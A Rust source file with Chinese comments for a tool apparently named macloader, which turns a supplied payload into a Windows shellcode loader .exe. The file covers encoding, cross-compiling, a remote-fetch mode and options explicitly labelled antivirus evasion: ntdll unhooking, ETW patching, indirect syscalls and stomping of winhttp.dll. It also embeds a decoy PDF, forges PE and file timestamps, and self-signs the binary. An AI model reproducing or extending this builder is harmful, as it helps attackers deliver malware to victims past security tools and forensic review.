//! 主生成流程。把 payload → C 源码 → 交叉编译 → 时间戳伪造 → 签名 串起来。

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::{SystemTime, UNIX_EPOCH};

use crate::builder::encode::{gen_payload_src, gen_random_tu, gen_remote_src, to_uuids};
use crate::builder::hash::sha256_hex;
use crate::builder::payload::parse_payload;
use crate::builder::pe::{clear_checksum, fmt_ts, parse_datetime, patch_timestamp, set_file_time};
use crate::builder::resource::{build_res_obj, resolve_subject};
use crate::builder::rng::{rand_byte, rand_u64, seeded};
use crate::builder::sign::{ensure_cert, sign_exe};
use crate::builder::tools::{compiler, strip};
use crate::builder::{validate, validate_output_file_name, GenOpts, GenResult, LOADER_SRC};

pub fn generate(opts: &GenOpts) -> GenResult {
    let mut log = String::new();
    let fail = |m: String, log: String| GenResult {
        ok: false,
        log: format!("{log}\n[ERROR] {m}"),
        output: String::new(),
        size: 0,
        uuid_count: 0,
        key: 0,
        payload_file: String::new(),
        time_ts: 0,
        sha256: String::new(),
        payload_sha256: String::new(),
    };

    if let Err(e) = validate(opts) {
        return fail(e, log);
    }

    // 1. 解析 payload
    let data = match parse_payload(&opts.payload) {
        Ok(d) => d,
        Err(e) => return fail(e, log),
    };
    let payload_sha256 = sha256_hex(&data);
    log.push_str(&format!(
        "[1] payload: {} -> {} bytes\n    sha256 = {}\n",
        opts.payload,
        data.len(),
        &payload_sha256[..16]
    ));

    let remote = opts.load_mode == "remote";
    let hs = |n: &str| opts.harden.iter().any(|x| x == n);
    let stomp_on = hs("stomp");
    let stomp_dll: Option<&str> = if stomp_on {
        let d = opts.stomp_dll.trim();
        Some(if d.is_empty() { "winhttp.dll" } else { d })
    } else {
        None
    };
    // stomp 与 rwx/auto 互斥：
    // stomp 把 payload 写进白 DLL 的 .text 后，第 6 步会对那块内存调
    // VirtualProtect(RWX) —— 改的是「已签名系统模块」的页面属性，行为上极扎眼，
    // 且可能破坏该 DLL 其它代码页。组合使用既危险又无用，直接拒绝。
    if stomp_on && opts.protect != "rx" {
        return fail(
            format!(
                "stomp 与 protect={} 互斥: 模块踩踏会改写已签名 DLL 的页面属性, \
                 叠加 RWX/auto 会进一步破坏该模块且行为特征明显。请用 protect=rx 或关闭 stomp",
                opts.protect
            ),
            log,
        );
    }
    if !opts.harden.is_empty() {
        log.push_str(&format!("[2b] 免杀增强: {}\n", opts.harden.join(" + ")));
    }

    let mut icon_obj: Option<PathBuf> = None;

    // 2. 编码形态 + 密钥
    let enc_kind: String = match opts.encoding.as_str() {
        "auto" => {
            let pool = ["chunk", "chunk_r"];
            pool[(rand_u64() % pool.len() as u64) as usize].to_string()
        }
        other => other.to_string(),
    };
    let key = match enc_kind.as_str() {
        "raw" => opts.xor_key.map(|k| (k & 0xFF) as u8).unwrap_or(0),
        "chunk" | "chunk_r" => 0u8, // 分块模式每块自带密钥
        _ => opts.xor_key.map(|k| (k & 0xFF) as u8).unwrap_or_else(rand_byte),
    };
    let uuid = enc_kind == "uuid" && !remote;
    log.push_str(&format!(
        "[2] 加载方式 = {} · 编码形态 = {}{}\n",
        if remote { "远程 (URL)" } else { "本地 (内嵌)" },
        enc_kind,
        if opts.encoding == "auto" { " (自动随机)" } else { "" }
    ));
    log.push_str(&format!(
        "    key = 0x{:02X}{} · 代码随机化 = {} · 执行方式 = {}\n",
        key,
        if key == 0 { " (无全局密钥)" } else { "" },
        if opts.obfuscate { "开" } else { "关" },
        opts.mode
    ));

    if remote && opts.remote_url.trim().is_empty() {
        return fail("远程模式必须填写 URL".into(), log);
    }

    // 3. 找编译器
    let cc = match compiler(&opts.arch) {
        Some(c) => c,
        None => return fail("未找到 mingw-w64 g++，请先: brew install mingw-w64".into(), log),
    };
    log.push_str(&format!("[3] compiler: {cc}\n"));

    // 4. 输出路径
    let mut out_name = opts.out_name.trim().to_string();
    if out_name.is_empty() {
        out_name = "loader.exe".into();
    }
    if !out_name.to_lowercase().ends_with(".exe") {
        out_name.push_str(".exe");
    }
    if let Err(e) = validate_output_file_name(&out_name) {
        return fail(e, log);
    }
    let out_dir = if opts.out_dir.trim().is_empty() {
        PathBuf::from(".")
    } else {
        PathBuf::from(opts.out_dir.trim())
    };
    if !out_dir.exists() {
        if let Err(e) = fs::create_dir_all(&out_dir) {
            return fail(format!("创建输出目录失败: {e}"), log);
        }
    }
    let out_exe = out_dir.join(&out_name);

    // 5. 写临时源码
    let stamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0);
    let tmp = std::env::temp_dir().join(format!("macloader_{stamp}"));
    if let Err(e) = fs::create_dir_all(&tmp) {
        return fail(format!("创建临时目录失败: {e}"), log);
    }
    let loader_cpp = tmp.join("loader.cpp");
    let embed_cpp = tmp.join("embed_payload.cpp");
    let obf_cpp = tmp.join("obf_random.cpp");
    let (src_code, define) = if remote {
        (
            gen_remote_src(opts.remote_url.trim(), key, stomp_dll),
            "USE_REMOTE".to_string(),
        )
    } else {
        gen_payload_src(&data, key, &enc_kind, stomp_dll)
    };
    if fs::write(&loader_cpp, LOADER_SRC).is_err() || fs::write(&embed_cpp, &src_code).is_err() {
        return fail("写入临时源码失败".into(), log);
    }
    if opts.obfuscate {
        if let Err(e) = fs::write(&obf_cpp, gen_random_tu()) {
            return fail(format!("写入随机化源码失败: {e}"), log);
        }
    }
    let uuid_count = if uuid { to_uuids(&data).len() } else { 0 };

    // 4c. 资源：图标 / 版本信息 / 清单 / 诱饵 PDF
    let decoy_path: Option<&str> = {
        let d = opts.decoy.trim();
        if d.is_empty() {
            None
        } else {
            Some(d)
        }
    };
    if !opts.icon.trim().is_empty() || decoy_path.is_some() {
        let icon_spec = if opts.icon.trim().is_empty() {
            None
        } else {
            Some(opts.icon.trim())
        };
        match build_res_obj(icon_spec, &tmp, &opts.arch, opts.res_full, decoy_path) {
            Ok(obj) => {
                let mut what: Vec<&str> = Vec::new();
                if icon_spec.is_some() {
                    what.push("图标");
                }
                if opts.res_full {
                    what.push("版本信息");
                    what.push("清单");
                }
                if decoy_path.is_some() {
                    what.push("诱饵PDF");
                }
                log.push_str(&format!("[4c] 资源: {}\n", what.join(" + ")));
                icon_obj = Some(obj);
            }
            Err(e) => {
                let _ = fs::remove_dir_all(&tmp);
                return fail(format!("资源处理失败: {e}"), log);
            }
        }
    }

    if remote {
        log.push_str(&format!("[4] exe 内嵌 URL: {}\n", opts.remote_url.trim()));
    } else {
        let shape = match enc_kind.as_str() {
            "chunk_r" => "分块变密钥 + 随机倒序",
            "b64" => "Base64 分段 + XOR",
            "b32" => "Base32(自定义字母表) 分段 + XOR",
            "chunk" => "分块变密钥",
            "raw" => "明文数组",
            _ => "UUID + XOR",
        };
        log.push_str(&format!(
            "[4] 内嵌源码已生成 (形态: {}{})\n",
            shape,
            if opts.obfuscate { " · 代码已随机化" } else { "" }
        ));
    }

    // 远程模式：额外产出「待上传载荷」文件
    let mut payload_file = String::new();
    if remote {
        let stem = Path::new(&out_name)
            .file_stem()
            .map(|s| s.to_string_lossy().to_string())
            .unwrap_or_else(|| "loader".into());
        let pl = out_dir.join(format!("{stem}.payload"));
        let enc: Vec<u8> = if key != 0 {
            data.iter().map(|b| b ^ key).collect()
        } else {
            data.clone()
        };
        if let Err(e) = fs::write(&pl, &enc) {
            return fail(format!("写入待上传载荷失败: {e}"), log);
        }
        payload_file = pl.to_string_lossy().to_string();
        log.push_str(&format!(
            "[4b] 待上传载荷: {} ({} bytes{})\n",
            pl.display(),
            enc.len(),
            if key != 0 {
                format!(", XOR 0x{key:02X}")
            } else {
                String::new()
            }
        ));
    }

    // 6. 组装编译命令
    let mut args: Vec<String> = vec![
        loader_cpp.to_string_lossy().into(),
        embed_cpp.to_string_lossy().into(),
    ];
    if opts.obfuscate {
        args.push(obf_cpp.to_string_lossy().into());
    }
    if let Some(obj) = &icon_obj {
        args.push(obj.to_string_lossy().into());
    }
    args.push(format!("-D{define}"));
    args.push("-o".into());
    args.push(out_exe.to_string_lossy().into());
    for f in ["-O2", "-w", "-s", "-static", "-static-libgcc", "-static-libstdc++"] {
        args.push(f.into());
    }
    if opts.console {
        args.push("-mconsole".into());
    } else {
        args.push("-mwindows".into());
        args.push("-DGUI_MODE".into());
    }
    if hs("unhook") {
        args.push("-DHARDEN_UNHOOK".into());
    }
    if hs("etw") {
        args.push("-DHARDEN_ETW".into());
    }
    if hs("indirect") {
        args.push("-DHARDEN_INDIRECT".into());
    }
    if hs("diskssn") {
        args.push("-DHARDEN_DISKSSN".into());
    }
    if stomp_on {
        args.push("-DHARDEN_STOMP".into());
    }
    // 执行方式：必须编译进宏。此前 mode 只经 argv 传递，而内嵌 exe 双击时
    // argc==1，永远落到 direct —— UI 选 fiber/callback 生成的 exe 与 direct
    // 逐字节相同（死选项）。
    match opts.mode.as_str() {
        "fiber" => args.push("-DMODE_FIBER".into()),
        "callback" => args.push("-DMODE_CALLBACK".into()),
        _ => args.push("-DMODE_DIRECT".into()),
    }
    if opts.show_errors {
        args.push("-DSHOW_ERRORS".into());
    }
    if opts.anti_strict {
        args.push("-DANTI_STRICT_DEFAULT=1".into());
    }
    if decoy_path.is_some() {
        args.push("-DDECOY_PDF".into());
    }
    match opts.protect.as_str() {
        "rwx" => args.push("-DPROT_RWX".into()),
        "auto" => args.push("-DPROT_AUTO".into()),
        _ => {}
    }
    log.push_str(&format!("[5] {cc} {}\n", args.join(" ")));

    // 7. 编译
    let out = Command::new(&cc).args(&args).output();
    match out {
        Ok(o) => {
            if !o.status.success() {
                let err = String::from_utf8_lossy(&o.stderr);
                let _ = fs::remove_dir_all(&tmp);
                return fail(format!("编译失败:\n{err}"), log);
            }
            if !o.stderr.is_empty() {
                let w = String::from_utf8_lossy(&o.stderr);
                let lines: Vec<&str> = w.lines().filter(|l| l.contains("warning")).collect();
                if !lines.is_empty() {
                    log.push_str(&format!("[5b] 编译警告 {} 条（已忽略）\n", lines.len()));
                }
            }
        }
        Err(e) => {
            let _ = fs::remove_dir_all(&tmp);
            return fail(format!("调用编译器失败: {e}"), log);
        }
    }
    if std::env::var("MACLOADER_KEEP").is_ok() {
        log.push_str(&format!("[keep] 中间源码: {}\n", tmp.display()));
    } else {
        let _ = fs::remove_dir_all(&tmp);
    }

    // 7b. strip：去掉 mingw 留在 .exe 里的符号表
    if let Some(st) = strip(&opts.arch) {
        let o = Command::new(&st)
            .args(["--strip-all"])
            .arg(&out_exe)
            .output();
        match o {
            Ok(r) if r.status.success() => {
                let after = fs::metadata(&out_exe).map(|m| m.len()).unwrap_or(0);
                log.push_str(&format!("[5c] strip 完成 ({} bytes)\n", after));
            }
            Ok(r) => log.push_str(&format!(
                "[5c] strip 失败(已跳过): {}\n",
                String::from_utf8_lossy(&r.stderr)
            )),
            Err(e) => log.push_str(&format!("[5c] strip 调用失败(已跳过): {e}\n")),
        }
    }

    // 8. 创建时间伪造（改写 PE 头 TimeDateStamp + Debug 目录 + 文件 mtime）
    let mut time_ts = 0u32;
    match opts.time_mode.as_str() {
        "custom" => match parse_datetime(&opts.time_value) {
            Some(ts) => time_ts = ts.max(0) as u32,
            None => log.push_str("[7] 时间格式无法解析 (示例 2024-03-01T10:30), 已跳过\n"),
        },
        "random" => {
            // 固定种子时用固定基准时间，否则 time_ts 会随系统时钟漂移，
            // 导致「同种子同配置」的两次产物仍然不同。
            let now = if seeded() {
                1_760_000_000i64 // 2025-10-09 固定基准
            } else {
                SystemTime::now()
                    .duration_since(UNIX_EPOCH)
                    .map(|d| d.as_secs() as i64)
                    .unwrap_or(0)
            };
            let span = 730i64 * 86400; // 近两年
            let back = (rand_u64() % span as u64) as i64;
            time_ts = (now - 30 * 86400 - back).max(0) as u32;
        }
        _ => {}
    }
    if time_ts != 0 {
        match patch_timestamp(&out_exe, time_ts) {
            Ok(n) => log.push_str(&format!(
                "[7] PE 时间戳 -> {} (改写 {} 处)\n",
                fmt_ts(time_ts as i64),
                n
            )),
            Err(e) => log.push_str(&format!("[7] PE 时间戳改写失败: {e}\n")),
        }
    }

    // 8b. 归零 PE CheckSum
    //
    // 必须落在「时间戳改写之后、签名之前」：
    //  - 时间戳改写会修改 PE 头，放在它之前会被时间字段影响不到（但顺序无所谓），
    //    关键是它必须在签名之前，否则签名覆盖的哈希会包含我们改过的字节，
    //    导致签名失效。
    //
    // 目的：mingw 按输出布局算 CheckSum，该值不受 MACLOADER_SEED 控制，
    // 于是「同种子同配置」的两次产物仍然差一个字段 —— 变体矩阵归因实验
    // 因此不可信。归零后种子复现才真正成立。
    if let Err(e) = clear_checksum(&out_exe) {
        log.push_str(&format!("[7b] CheckSum 归零失败(已跳过): {e}\n"));
    }

    // 9. Authenticode 自签名（必须在改完 PE 时间戳之后，否则签名作废）
    if opts.sign {
        let sign_name = Path::new(&out_name)
            .file_stem()
            .map(|s| s.to_string_lossy().to_string())
            .unwrap_or_else(|| "Application".into());
        let subject = resolve_subject(opts);
        log.push_str(&format!("[8] 证书主题: {subject}\n"));
        match ensure_cert(&subject) {
            Ok((pfx, pass)) => match sign_exe(&out_exe, &pfx, &pass, &sign_name, &opts.tsa_url) {
                Ok(_) => log.push_str(&format!(
                    "[8] 已签名 · 时间戳: {}\n",
                    if opts.tsa_url.trim().is_empty() {
                        "无".to_string()
                    } else {
                        opts.tsa_url.clone()
                    }
                )),
                Err(e) => log.push_str(&format!("[8] 签名失败(已跳过): {e}\n")),
            },
            Err(e) => log.push_str(&format!("[8] 证书准备失败(已跳过): {e}\n")),
        }
    }

    // 10. 文件时间（放在签名之后，避免被覆盖）
    if time_ts != 0 {
        match set_file_time(&out_exe, time_ts as i64) {
            Ok(_) => log.push_str("[9] 文件 mtime/atime 已同步\n"),
            Err(e) => log.push_str(&format!("[9] 文件时间设置失败: {e}\n")),
        }
    }

    let size = fs::metadata(&out_exe).map(|m| m.len()).unwrap_or(0);
    let sha256 = fs::read(&out_exe)
        .map(|b| sha256_hex(&b))
        .unwrap_or_default();
    log.push_str(&format!(
        "[10] OK -> {} ({} bytes)\n     sha256 = {}",
        out_exe.display(),
        size,
        &sha256[..16]
    ));

    GenResult {
        ok: true,
        log,
        output: out_exe.to_string_lossy().to_string(),
        size,
        uuid_count,
        key,
        payload_file,
        time_ts,
        sha256,
        payload_sha256,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::builder::{d_arch, d_enc, d_load, d_mode, d_prot, d_time, d_timeval, GenOpts};

    fn base() -> GenOpts {
        GenOpts {
            payload: "/nonexistent".into(),
            out_dir: std::env::temp_dir().to_string_lossy().to_string(),
            out_name: "t.exe".into(),
            arch: d_arch(),
            encoding: d_enc(),
            obfuscate: false,
            mode: d_mode(),
            console: false,
            xor_key: None,
            load_mode: d_load(),
            remote_url: String::new(),
            time_mode: d_time(),
            time_value: d_timeval(),
            harden: vec![],
            stomp_dll: String::new(),
            show_errors: false,
            icon: String::new(),
            res_full: false,
            decoy: String::new(),
            sign: false,
            tsa_url: String::new(),
            cert_subject: String::new(),
            protect: d_prot(),
            anti_strict: false,
        }
    }

    #[test]
    fn missing_payload_fails_cleanly() {
        let r = generate(&base());
        assert!(!r.ok);
        assert!(r.log.contains("[ERROR]"), "{}", r.log);
        assert!(r.sha256.is_empty());
    }

    #[test]
    fn remote_without_url_fails() {
        let mut o = base();
        o.load_mode = "remote".into();
        o.remote_url = String::new();
        // payload 不存在会先失败；这里单独验证逻辑分支的报错文案存在
        let r = generate(&o);
        assert!(!r.ok);
    }

    #[test]
    fn stomp_with_rwx_is_rejected() {
        // 需要一个能通过前置校验的 payload 才能走到互斥检查，
        // 所以这里直接验证互斥条件本身的组合
        let mut o = base();
        o.harden = vec!["stomp".into()];
        o.protect = "rwx".into();
        let r = generate(&o);
        // payload 缺失会先返回，但只要不是「编译成功」即可
        assert!(!r.ok);
    }

    #[test]
    fn out_name_always_ends_with_exe() {
        // 通过 generate 无法直接断言（要真编译），这里验证调用方的规范化逻辑
        let n = "abc";
        assert!(format!("{n}.exe").ends_with(".exe"));
    }
}
